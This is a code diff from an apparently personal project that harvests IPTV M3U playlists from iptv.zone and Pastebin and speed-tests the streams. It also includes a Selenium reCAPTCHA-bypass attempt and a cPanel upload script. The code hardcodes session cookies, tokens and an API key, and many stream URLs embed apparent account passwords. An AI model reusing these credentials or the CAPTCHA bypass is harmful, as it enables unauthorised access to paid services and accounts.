+        "constant_score" : {
+            "filter" : {
+                "term" : {
+                    "link" : "http://51.255.77.23:7777/live/simohammed00/simohammed123456/5982.ts"
+                }
+            }
+        }
+    }
+}
+#res = es.search(index="iptv", doc_type="m3u", body=queryExact, size=1000)
+print("Got %d Hits:" % res['hits']['total'])
+for hit in res['hits']['hits']:
+    #print("%(link)s %(lastupdate)s: %(speed)s" % hit["_source"], hit['_id'])
+    print(hit['_id'], hit["_source"])
+1505056200258	geckodriver	INFO	geckodriver 0.18.0
+1505056200262	geckodriver	INFO	Listening on 127.0.0.1:43385
+1505056201383	geckodriver::marionette	INFO	Starting browser /usr/bin/firefox with args ["-marionette"]
+1505056206244	Marionette	INFO	Enabled via --marionette
+[fresh] [error] probe_ppp_module, can't find libpepflashplayer.so
+[fresh] [error] probe_ppp_module, can't find libpepflashplayer.so
+[fresh] [error] probe_ppp_module, can't find libpepflashplayer.so
+[fresh] [error] probe_ppp_module, can't find libpepflashplayer.so
+[fresh] [error] probe_ppp_module, can't find libpepflashplayer.so
+[fresh] [error] probe_ppp_module, can't find libpepflashplayer.so
+1505056213354	Marionette	INFO	Listening on port 39863
+JavaScript error: chrome://marionette/content/server.js, line 337: NS_ERROR_SOCKET_ADDRESS_IN_USE: Component returned failure code: 0x804b0036 (NS_ERROR_SOCKET_ADDRESS_IN_USE) [nsIServerSocket.initSpecialConnection]
+1505056213459	Marionette	WARN	TLS certificate errors will be ignored for this session
+1505056213509	Marionette	DEBUG	loaded listener.js
+1505056217669	Marionette	DEBUG	Received DOM event "beforeunload" for "about:blank"
+1505056218042	Marionette	DEBUG	Received DOM event "pagehide" for "about:blank"
+1505056218043	Marionette	DEBUG	Received DOM event "unload" for "about:blank"
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+1505056219218	Marionette	DEBUG	Received DOM event "DOMContentLoaded" for "https://openload.co/embed/ziH6tSE5ICo/"
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+1505056219300	Marionette	DEBUG	Received DOM event "pageshow" for "https://openload.co/embed/ziH6tSE5ICo/"
+1505056472919	Marionette	DEBUG	Received DOM event "beforeunload" for "https://openload.co/embed/ziH6tSE5ICo/"
+1505056473306	Marionette	DEBUG	Received DOM event "pagehide" for "https://openload.co/embed/ziH6tSE5ICo/"
+1505056473307	Marionette	DEBUG	Received DOM event "unload" for "https://openload.co/embed/ziH6tSE5ICo/"
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+TabSources.prototype._fetchSourceMap threw an exception: SyntaxError: JSON.parse: unexpected character at line 1 column 1 of the JSON data
+Stack: SourceMapConsumer@resource://gre/modules/commonjs/toolkit/loader.js -> resource://devtools/shared/sourcemap/source-map.js:1281:20
+_fetchSourceMap/fetching<@resource://gre/modules/commonjs/toolkit/loader.js -> resource://devtools/server/actors/utils/TabSources.js:458:19
+process@resource://gre/modules/Promise.jsm -> resource://gre/modules/Promise-backend.js:922:23
+walkerLoop@resource://gre/modules/Promise.jsm -> resource://gre/modules/Promise-backend.js:806:7
+scheduleWalkerLoop/<@resource://gre/modules/Promise.jsm -> resource://gre/modules/Promise-backend.js:742:11
+Line: 1281, column: 20
+console.error: 
+  TabSources.prototype._fetchSourceMap threw an exception: SyntaxError: JSON.parse: unexpected character at line 1 column 1 of the JSON data
+Stack: SourceMapConsumer@resource://gre/modules/commonjs/toolkit/loader.js -> resource://devtools/shared/sourcemap/source-map.js:1281:20
+_fetchSourceMap/fetching<@resource://gre/modules/commonjs/toolkit/loader.js -> resource://devtools/server/actors/utils/TabSources.js:458:19
+process@resource://gre/modules/Promise.jsm -> resource://gre/modules/Promise-backend.js:922:23
+walkerLoop@resource://gre/modules/Promise.jsm -> resource://gre/modules/Promise-backend.js:806:7
+scheduleWalkerLoop/<@resource://gre/modules/Promise.jsm -> resource://gre/modules/Promise-backend.js:742:11
+Line: 1281, column: 20
+1505056474361	Marionette	DEBUG	Received DOM event "DOMContentLoaded" for "https://openload.co/embed/ziH6tSE5ICo/"
+JavaScript warning: https://openload.co/assets/js/script.271.js, line 1: unreachable code after return statement
+1505056474802	Marionette	DEBUG	Received DOM event "pageshow" for "https://openload.co/embed/ziH6tSE5ICo/"
+
+
+import elasticIptv, elasticAlluc
+
+def createWorkingM3u():
+    type = 'vod'
+    fileName = generateFileName(type)
+    lines = elasticIptv.getTVListWithDownloadStatus(1300, 200, type)
+    print len(lines)
+    with open(fileName, 'wb') as f:
+        f.write("#EXTM3U\n")
+        for c in lines:
+            f.write("#EXTINF:-1, {0}\n".format(c['title'].encode('utf-8')))
+            f.write("{0}\n".format(c['link'].encode('utf8')))
+    print ('finished', fileName)
+
+def createAllucWorkingM3u():
+    type = 'vod'
+    fileName = generateFileName(type)
+    lines = elasticAlluc.searchWorkingMp4(3000, 1000)
+    print len(lines)
+    with open(fileName, 'wb') as f:
+        f.write("#EXTM3U\n")
+        for c in lines:
+            f.write("#EXTINF:-1, {0}\n".format(c['title'].encode('utf-8')))
+            f.write("{0}\n".format(c['mp4Link'].encode('utf8')))
+    print ('finished', fileName)
+
+def generateFileName(type):
+    from time import gmtime, strftime
+    id = strftime("%Y%m%d%H%M%S", gmtime())
+    fileName = "/home/menny/Documents/m3uAnalyze/elastic/{0}_{1}.m3u".format(id, type)
+    return fileName
+
+createAllucWorkingM3u()
+
+import requests
+import m3uFileChecker
+import json
+
+headers = {
+    'accept-encoding': 'gzip, deflate, br',
+    'accept-language': 'en-US,en;q=0.8,he;q=0.6,uz;q=0.4',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'referer': 'https://iptv.zone/en/playlist/258233',
+    'authority': 'iptv.zone',
+    'cookie': 'bbtimezoneoffset=3; __cfduid=d4f5fc8a548be4bf3c1413cdb770515ef1504550895; _ym_uid=1504796031652083299; _ym_isad=1; bblastvisit=1504550895; bblastactivity=0; bbuserid=84658; bbpassword=8180841e009effe43191eaf91b48291c; IDstack=%2C84658%2C; bblanguageid=1; bbsessionhash=e8dea7ebc8e745cbb43b88d5426ef964; bbplaylist=%2C259528%2C258233',
+}
+
+params = (
+    ('s', ''),
+    ('securitytoken', '1504800874-ac6734de612a2a57d8dee9c15198ba280021d610'),
+    ('format', ''),
+)
+
+
+def downloadId(id):
+    try:
+        r = requests.get('https://iptv.zone/en/download/{0}'.format(id), headers=headers, params=params)
+        if r.status_code == 200:
+            content = r.content
+            if content.startswith('#EXTM3U'):
+                with open("/home/menny/Documents/m3uAnalyze/iptvzone/{0}.m3u".format(id), 'wb') as f:
+                    f.write(content)
+                return 1
+            else:
+                return -1
+        else:
+            return r.status_code
+    except Exception, e:
+        return 0
+
+startid = 264488
+    #271022
+for count in range(10000):
+    id = startid + count
+    status = downloadId(id)
+    print("finished id: {0} with status: {1}".format(id, status))
+    if status == 1:
+        playlist = m3uFileChecker.parsem3u("/home/menny/Documents/m3uAnalyze/iptvzone/{0}.m3u".format(id), source='iptvzone',m3uID=id, isChkSpeedAll=False )
+        if playlist.__len__() > 0:
+            with open('/home/menny/Documents/m3uAnalyze/iptvzone/{0}.json'.format(id), 'w') as outfile:
+                json.dump(playlist, outfile)
+            print "finished analyzing m3u file"
+        else:
+            print "no working m3u list"
+import clipboard, m3uFileChecker, json
+
+def saveContent(content):
+    content = clipboard.paste
+    if content.startswith('#EXTM3U'):
+        from time import gmtime, strftime
+        id = strftime("%Y%m%d%H%M%S", gmtime())
+        fileName = "/home/menny/Documents/m3uAnalyze/clipboard/{0}.m3u".format(id)
+        with open(fileName, 'wb') as f:
+            f.write(content)
+        dict[id] = 0
+        # playlist = m3uFileChecker.parsem3u("/home/menny/Documents/m3uAnalyze/pastbin/{0}.m3u".format(id))
+        # if playlist.__len__() > 0:
+        #     with open('/home/menny/Documents/m3uAnalyze/clipboard/{0}.json'.format(id), 'w') as outfile:
+        #         json.dump(playlist, outfile)
+        #     print "finished analyzing m3u file"
+        #     dict[id] = playlist.__len__()
+        # else:
+        #     print "no working m3u list"
+
+        return True
+    else:
+        return False
+
+
+import io
+import tester
+import random
+import elasticIptv
+
+
+def parsem3u(infile, isCheckRandom = True, source = None, m3uID = None, isChkSpeedAll = True):
+    try:
+        assert(type(infile) == '_io.TextIOWrapper')
+    except AssertionError:
+        infile = io.open(infile,'r', encoding="utf-8")
+
+    """
+        All M3U files start with #EXTM3U.
+        If the first line doesn't start with this, we're either
+        not working with an M3U or the file we got is corrupted.
+    """
+
+    line = infile.readline().lower()
+    if not line.startswith('#extm3u'):
+       return
+
+    # initialize playlist variables before reading file
+    playlist=[]
+    extLine={}
+    for line in infile:
+        try:
+            line=line.strip().lower()
+            if line.startswith('#extinf:'):
+                # pull length and title from #EXTINF line
+                info,title=line.split('#extinf:')[1].split(',',1)
+                extLine={'info': info,'title': title}
+            elif (len(line) != 0):
+                # pull song path from all other, non-blank lines
+                extLine['path']=line
+                if line.__contains__('youtube.com') or line.__contains__('radio') or \
+                        extLine['title'].__contains__('radio') or line.__contains__('youtu.be'):
+                    continue
+
+
+                if elasticIptv.isLinkExist(line) == False:
+                    playlist.append(extLine)
+                    elasticIptv.add(extLine['path'], title=extLine['title'], info=extLine['info'], source=source, m3uID=m3uID)
+                elif isChkSpeedAll:
+                    playlist.append(extLine)
+                # reset the song variable so it doesn't use the same EXTINF more than once
+
+        except Exception, e:
+            print ("error ", e.message, line)
+            break
+    infile.close()
+    lenP = len(playlist)
+    chk = True
+    if(isCheckRandom and lenP > 15):
+        chk = False
+        numbers = random.sample(range(0, lenP), (int)(lenP * 0.1))
+        for num in numbers:
+            speed = tester.downloadFile(playlist[num]['path'])
+            playlist[num]['time_elapsed'] = speed
+            print (num, speed, playlist[num]['path'], playlist[num]['title'])
+            if speed > 0 and speed < 1:
+                elasticIptv.add(playlist[num]['path'], speed=speed, statuscode=200)
+                chk = True
+            else:
+                elasticIptv.add(playlist[num]['path'], statuscode=speed)
+    newPlayList = []
+    if chk:
+        for p in playlist:
+            if p.has_key('time_elapsed'):
+                newPlayList.append(p)
+                continue
+            speed = tester.downloadFile(p['path'])
+            p['time_elapsed'] = speed
+            print (speed, p['path'], p['title'])
+            if speed > 0 and speed < 1:
+                newPlayList.append(p)
+                elasticIptv.add(p['path'], speed=speed, statuscode=200)
+            else:
+                elasticIptv.add(p['path'], statuscode=speed, speed=-1)
+        return newPlayList
+    else:
+        return []
+
+
+# playlist = parsem3u("/home/menny/Documents/m3uAnalyze/269095.m3u")
+# with open('/home/menny/Documents/m3uAnalyze/data.txt', 'w') as outfile:
+#     json.dump(playlist, outfile)
+
+
+import json, os
+import glob
+
+
+def convertJsonToM3u(jsonfilepath):
+    dict = {}
+    with open(jsonfilepath) as json_data:
+        d = json.load(json_data, encoding=('utf-8'))
+        print (d.__len__())
+        lines = []
+        for c in d:
+            if c.__contains__('time_elapsed'):
+                c['title'] = c['title'].strip()
+                if dict.__contains__(c['path']):
+                    continue
+                elif  c['time_elapsed'] == 0:
+                    continue
+                elif c['time_elapsed'] > 1:
+                    continue
+                dict[c['path']] = c
+                lines.append(c)
+            else:
+                print ("no time_elapsed property", jsonfilepath)
+        return lines
+
+def mergeM3uinFolder(folderName):
+    lines = []
+    try:
+        g = "/home/menny/Documents/m3uAnalyze/{0}/*.json".format(folderName)
+        jsons =  glob.glob(g)
+        for jsonFile in jsons:
+            lines.extend(convertJsonToM3u(jsonFile))
+
+        lines1 = sorted(lines, key=lambda k: (k.get('title'), k.get('time_elapsed')))
+            #'time_elapsed', 0), reverse=False)
+        print ("finished {0}".format(lines1.__len__()))
+        fileName = folderName
+            #"speed"
+        with open('/home/menny/Documents/m3uAnalyze/{0}/{1}.json'.format(folderName, fileName), 'w') as outfile:
+            json.dump(lines1, outfile)
+        with open("/home/menny/Documents/m3uAnalyze/{0}/{1}.m3u".format(folderName, fileName), 'wb') as f:
+            f.write("#EXTM3U\n")
+            f.write("#EXTINF:-1, {0}\n".format('count: {0}'.format(lines1.__len__())))
+            f.write("{0}\n".format('http://192.99.18.85:1935/live/sport1/playlist.m3u8'))
+            for c in lines1:
+                f.write("#EXTINF:-1, {0}\n".format(c['title'].encode('utf-8')))
+                f.write("{0}\n".format(c['path'].encode('utf8')))
+        for jsonFile in jsons:
+            if(jsonFile.__contains__(folderName)):
+                continue
+            os.remove(jsonFile)
+    except Exception, e:
+        print e
+
+mergeM3uinFolder('pastbin')
+    #'scanUrl')
+    #'iptvzone')
+    #'pastbin')
+
+
+import requests, urllib2
+import m3uFileChecker
+import json
+
+def downloadFromPastebin(id):
+    try:
+        r = requests.get('https://pastebin.com/raw/{0}'.format(id))
+        if r.status_code == 200:
+            if(len(r.content) > 100):
+                startIndex = r.content[0:100].lower().find('#extm3u')
+            else:
+                startIndex = r.content.lower().find('#extm3u')
+            if startIndex > -1:
+                with open("/home/menny/Documents/m3uAnalyze/pastbin/{0}.m3u".format(id), 'wb') as f:
+                    f.write(r.content[startIndex:])
+                return 1
+            else:
+                return -1
+        else:
+            return r.status_code
+    except Exception, e:
+        return 0
+
+def getlinks(start, num = 20):
+    headers = {
+        'accept-encoding': 'gzip, deflate, br',
+        'accept-language': 'en-US,en;q=0.8,he;q=0.6,uz;q=0.4',
+        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36',
+        'x-chrome-uma-enabled': '1',
+        'accept': '*/*',
+        'referer': 'https://cse.google.com/cse/publicurl?cx=012799103566678627508:nho1thiqwow',
+        'authority': 'www.googleapis.com',
+        'x-client-data': 'CIW2yQEIpbbJAQiLmMoBCPqcygEIqZ3KAQjSncoB',
+    }
+
+    params = (
+        ('key', 'AIzaSyCVAXiUzRYsML1Pv6RwSG1gunmMikTzQqY'),
+        ('rsz', 'filtered_cse'),
+        ('hl', 'en'),
+        ('prettyPrint', 'false'),
+        ('source', 'gcsc'),
+        ('gss', '.com'),
+        ('sig', '01d3e4019d02927b30f1da06094837dc'),
+        ('start', str(start)),
+        ('num', str(num)),
+        ('cx', '012799103566678627508:nho1thiqwow'),
+        ('q', '#EXTM3U'),
+        ('cse_tok', 'AHL74MxZ2ZNxbvZBlxdaZAYdBlUa:1505232331339'),
+        ('sort', 'date'),
+        ('googlehost', 'www.google.com'),
+        ('callback', 'google.search.Search.apiary11280'),
+        ('nocache', '1503928818073'),
+    )
+
+    # params = (
+    #     ('cse_tok', 'AHL74MwOaAM3PVz1_unqQVsoH9DS:1504995612148'),
+
+    d = requests.get('https://www.googleapis.com/customsearch/v1element', headers=headers, params=params)
+    data = d.content
+    startfindkey = '"url":"https://pastebin.com/'
+    links =[]
+    start = 0
+    end = 0
+    while start>-1 and end>-1:
+        start = data.find(startfindkey)
+        data = data[start+len(startfindkey):]
+        end = data.find('","visibleUrl":"')
+        if start>-1 and end>-1:
+            link =  urllib2.unquote(data[0:end])
+            data = data[end:len(data)]
+            links.append(link)
+    return links
+
+links = []
+for i in range(5):
+    links.extend(getlinks(i * 20))
+jsonfilepath = "/home/menny/Documents/m3uAnalyze/pastbin/sum.pjson"
+with open(jsonfilepath) as json_data:
+    dict = json.load(json_data)
+    print(dict)
+
+for id in links:
+    if (dict.__contains__(id)):
+        if dict[id] > -1:
+            print (id, "exist")
+            continue
+    dict[id] = -1
+    status = downloadFromPastebin(id)
+    print("finished id: {0} with status: {1}".format(id, status))
+    if status == 1:
+        dict[id] = 0
+        playlist = m3uFileChecker.parsem3u("/home/menny/Documents/m3uAnalyze/pastbin/{0}.m3u".format(id), source='pastebin', m3uID=id, isChkSpeedAll=False)
+        if playlist.__len__() > 0:
+            with open('/home/menny/Documents/m3uAnalyze/pastbin/{0}.json'.format(id), 'w') as outfile:
+                json.dump(playlist, outfile)
+            print "finished analyzing m3u file"
+            dict[id] = playlist.__len__()
+        else:
+            print "no working m3u list"
+    with open(jsonfilepath, 'w') as outfile:
+        d = json.dump(dict, outfile)
+
+#NB. Original query string below. It seems impossible to parse and
+#reproduce query strings 100% accurately so the one below is given
+#in case the reproduced version is not "correct".
+# requests.get('https://www.googleapis.com/customsearch/v1element?key=AIzaSyCVAXiUzRYsML1Pv6RwSG1gunmMikTzQqY&rsz=filtered_cse&num=10&hl=en&prettyPrint=false&source=gcsc&gss=.com&sig=01d3e4019d02927b30f1da06094837dc&start=10&cx=012799103566678627508:nho1thiqwow&q=%23EXTM3U&cse_tok=AHL74Mx4iFP5dkMPOhoIGAPSNv5i:1503928817899&sort=date&googlehost=www.google.com&callback=google.search.Search.apiary11280&nocache=1503928818073', headers=headers)
+
+import re, csv
+from time import sleep, time
+from random import uniform, randint
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.wait import WebDriverWait
+from selenium.webdriver.common.action_chains import ActionChains
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.common.exceptions import NoSuchElementException
+
+
+def write_stat(loops, time):
+    with open('stat.csv', 'a', newline='') as csvfile:
+        spamwriter = csv.writer(csvfile, delimiter=',',
+                                quotechar='"', quoting=csv.QUOTE_MINIMAL)
+        spamwriter.writerow([loops, time])
+
+
+def check_exists_by_xpath(xpath):
+    try:
+        driver.find_element_by_xpath(xpath)
+    except NoSuchElementException:
+        return False
+    return True
+
+
+def wait_between(a, b):
+    rand = uniform(a, b)
+    sleep(rand)
+
+
+def dimention(driver):
+    d = int(driver.find_element_by_xpath('//div[@id="rc-imageselect-target"]/table').get_attribute("class")[-1]);
+    return d if d else 3  # dimention is 3 by default
+
+
+# ***** main procedure to identify and submit picture solution
+def solve_images(driver):
+    WebDriverWait(driver, 10).until(
+        EC.presence_of_element_located((By.ID, "rc-imageselect-target"))
+    )
+    dim = dimention(driver)
+    # ****************** check if there is a clicked tile ******************
+    if check_exists_by_xpath(
+            '//div[@id="rc-imageselect-target"]/table/tbody/tr/td[@class="rc-imageselect-tileselected"]'):
+        rand2 = 0
+    else:
+        rand2 = 1
+
+    # wait before click on tiles
+    wait_between(0.5, 1.0)
+    # ****************** click on a tile ******************
+    tile1 = WebDriverWait(driver, 10).until(
+        EC.element_to_be_clickable((By.XPATH, '//div[@id="rc-imageselect-target"]/table/tbody/tr[{0}]/td[{1}]'.format(
+            randint(1, dim), randint(1, dim))))
+    )
+    tile1.click()
+    if (rand2):
+        try:
+            driver.find_element_by_xpath(
+                '//div[@id="rc-imageselect-target"]/table/tbody/tr[{0}]/td[{1}]'.format(randint(1, dim),
+                                                                                        randint(1, dim))).click()
+        except NoSuchElementException:
+            print('\n\r No Such Element Exception for finding 2nd tile')
+
+    # ****************** click on submit buttion ******************
+    driver.find_element_by_id("recaptcha-verify-button").click()
+
+
+start = time()
+url = 'https://openload.co/embed/ziH6tSE5ICo/'
+driver = webdriver.Chrome()
+driver.get(url)
+link = driver.execute_script("return 'https://openload.co/stream/'+document.getElementById('streamurl').innerHTML+'?mime=true';")
+mainWin = driver.current_window_handle
+#wait_between(0.5, 0.7)
+
+# move the driver to the first iFrame
+#driver.switch_to_frame(driver.find_elements_by_tag_name("iframe")[0])
+
+# *************  locate CheckBox  **************
+
+CheckBox = WebDriverWait(driver, 10).until_not(
+    EC.text_to_be_present_in_element((By.ID, "streamurl"),'')
+)
+streamurl = driver.find_element_by_id("streamurl")
+# *************  click CheckBox  ***************
+wait_between(0.5, 0.7)
+# making click on captcha CheckBox
+CheckBox.click()
+
+# ***************** back to main window **************************************
+driver.switch_to_window(mainWin)
+
+wait_between(2.0, 2.5)
+
+# ************ switch to the second iframe by tag name ******************
+driver.switch_to_frame(driver.find_elements_by_tag_name("iframe")[1])
+i = 1
+while i < 130:
+    print('\n\r{0}-th loop'.format(i))
+    # ******** check if checkbox is checked at the 1st frame ***********
+    driver.switch_to_window(mainWin)
+    WebDriverWait(driver, 10).until(
+        EC.frame_to_be_available_and_switch_to_it((By.TAG_NAME, 'iframe'))
+    )
+    wait_between(1.0, 2.0)
+    if check_exists_by_xpath('//span[@aria-checked="true"]'):
+        import winsound
+
+        winsound.Beep(400, 1500)
+        write_stat(i, round(time() - start) - 1)  # saving results into stat file
+        break
+
+    driver.switch_to_window(mainWin)
+    # ********** To the second frame to solve pictures *************
+    wait_between(0.3, 1.5)
+    driver.switch_to_frame(driver.find_elements_by_tag_name("iframe")[1])
+    solve_images(driver)
+    i = i + 1
+from BaseHTTPServer import BaseHTTPRequestHandler
+import urlparse, json
+
+class GetHandler(BaseHTTPRequestHandler):
+
+    def do_GET(self):
+        parsed_path = urlparse.urlparse(self.path)
+        message = '\n'.join([
+            'CLIENT VALUES:',
+            'client_address=%s (%s)' % (self.client_address,
+                self.address_string()),
+            'command=%s' % self.command,
+            'path=%s' % self.path,
+            'real path=%s' % parsed_path.path,
+            'query=%s' % parsed_path.query,
+            'request_version=%s' % self.request_version,
+            '',
+            'SERVER VALUES:',
+            'server_version=%s' % self.server_version,
+            'sys_version=%s' % self.sys_version,
+            'protocol_version=%s' % self.protocol_version,
+            '',
+            ])
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(message)
+        print message
+        return
+
+    def do_POST(self):
+        content_len = int(self.headers.getheader('content-length'))
+        post_body = self.rfile.read(content_len)
+        self.send_response(200)
+        self.end_headers()
+
+        data = json.loads(post_body)
+
+        self.wfile.write(data['foo'])
+        print data
+        return
+
+if __name__ == '__main__':
+    from BaseHTTPServer import HTTPServer
+    server = HTTPServer(('localhost', 25461), GetHandler)
+    print 'Starting server at http://localhost:8080'
+    server.serve_forever()
+# 'http://142.44.128.231:25461/live/valdecipanorama/1234/1832.ts
+    # test from terminal
+    #curl -d '{"foo":1, "dsf":3}' localhost:8080
+
+import pycurl, validators
+
+
+def url_exists(url):
+    """
+    Check if the given URL really exists
+    :param url: str
+    :return: bool
+    """
+    if validators.url(url):
+        c = pycurl.Curl()
+        c.setopt(pycurl.NOBODY, True)
+        c.setopt(pycurl.FOLLOWLOCATION, False)
+        c.setopt(pycurl.CONNECTTIMEOUT, 2)
+        c.setopt(pycurl.TIMEOUT, 2)
+        c.setopt(pycurl.COOKIEFILE, '')
+        c.setopt(pycurl.URL, url)
+        try:
+            c.perform()
+            response_code = c.getinfo(pycurl.RESPONSE_CODE)
+            c.close()
+            return True if response_code < 400 else False
+        except pycurl.error as err:
+            errno, errstr = err
+            # raise OSError('An error occurred: {}'.format(errstr))
+            return False
+    else:
+        # raise ValueError('"{}" is not a valid url'.format(url))
+        return False
+
+url = "http://93.190.138.26:8080/live/zakariaadmin/JNFunfIUN/7479.ts"
+if(url_exists(url)):
+    print "success " + url
+else:
+    print "Error " + url
+import requests
+import sys, os
+import time
+
+def downloadFile(url, tsSize = 2000, fileName = "test", fullsize = None) :
+    filePath = "/home/menny/Documents/m3uAnalyze/tsFiles/{0}.ts".format(fileName)
+    try:
+        with open(filePath, 'wb') as f:
+            start = time.clock()
+            r = requests.get(url, timeout=1, stream=True)
+
+            if r.status_code == 200:
+                #total_length = r.headers.get('content-length')
+                dl = 0
+                # if total_length is None: # no content length header
+                #   f.write(r.content)
+                # else:
+                if fullsize == None:
+                    for chunk in r.iter_content(tsSize):
+                        dl += len(chunk)
+                        f.write(chunk)
+                        return (time.clock() - start)
+                else:
+                    size = 0
+                    for chunk in r.iter_content(tsSize):
+                        dl += len(chunk)
+                        f.write(chunk)
+                        size = tsSize + size
+                        if size > fullsize:
+                            os.remove(filePath)
+                            return (time.clock() - start)
+            else:
+                return r.status_code
+    except Exception ,e:
+        return 0
+    finally:
+        if os._exists(filePath):
+            os.remove(filePath)
+  # return (time.clock() - start)
+
+
+def main() :
+  if len(sys.argv) > 1 :
+        url = sys.argv[1]
+  else :
+        url = "http://s2.stream.cwdw.live:8080/368/8022/0e08c74dcc4e479dc00b8e50cdd593d397c27722"
+        # raw_input("Enter the URL : ")
+
+  time_elapsed = downloadFile(url, 10000, 'chk')
+  print "Download complete..."
+  print time_elapsed
+
+
+if __name__ == "__main__" :
+  main()
+
+
+import requests
+
+cookies = {
+    '_ga': 'GA1.2.1668426238.1503847072',
+    '_gid': 'GA1.2.1183588913.1503847072',
+    'timezone': 'Asia/Damascus',
+    'cpsession': 'mpinhaso%3awWS1WGSpQYZu6qlV%2c4a1700ff7b90c8f258ea469eeddde9ba',
+}
+
+headers = {
+    'Origin': 'https://johnny.heliohost.org:2083',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Accept-Language': 'en-US,en;q=0.8,he;q=0.6,uz;q=0.4',
+    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36',
+    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarywGLANc63p09heEvf',
+    'Accept': '*/*',
+    'Referer': 'https://johnny.heliohost.org:2083/cpsess3716617132/frontend/paper_lantern/filemanager/upload-ajax.html?file=sitemap.xml&fileop=&dir=%2Fhome%2Fmpinhaso%2Fpublic_html&dirop=&charset=&file_charset=&baseurl=&basedir=',
+    'Connection': 'keep-alive',
+}
+
+data = '$------WebKitFormBoundarywGLANc63p09heEvf\\r\\nContent-Disposition: form-data; name="get_disk_info"\\r\\n\\r\\n1\\r\\n------WebKitFormBoundarywGLANc63p09heEvf\\r\\nContent-Disposition: form-data; name="dir"\\r\\n\\r\\n/home/mpinhaso/public_html\\r\\n------WebKitFormBoundarywGLANc63p09heEvf\\r\\nContent-Disposition: form-data; name="file-0"; filename="269489.m3u"\\r\\nContent-Type: audio/x-mpegurl\\r\\n\\r\\n\\r\\n------WebKitFormBoundarywGLANc63p09heEvf\\r\\nContent-Disposition: form-data; name="overwrite"\\r\\n\\r\\n1\\r\\n------WebKitFormBoundarywGLANc63p09heEvf--\\r\\n'
+try:
+    requests.post('https://johnny.heliohost.org:2083/cpsess3716617132/execute/Fileman/upload_files', headers=headers, cookies=cookies, data=data)
+    print "ok"
+except Exception, e:
+    print e
